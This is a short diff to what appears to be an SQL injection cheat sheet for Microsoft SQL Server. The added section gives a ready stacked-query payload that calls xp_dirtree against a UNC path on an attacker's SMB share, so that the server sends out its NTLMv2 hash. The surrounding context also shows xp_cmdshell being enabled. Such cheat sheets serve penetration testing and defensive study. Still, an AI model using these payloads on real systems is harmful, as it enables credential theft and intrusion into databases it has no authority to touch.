@@ -137,6 +137,14 @@ EXEC sp_configure 'xp_cmdshell',1;
 RECONFIGURE;
 ```
 
+## MSSQL UNC Path
+
+MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.
+
+```sql
+1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
+```
+
 ## MSSQL Make user DBA (DB admin)
 
 ```sql
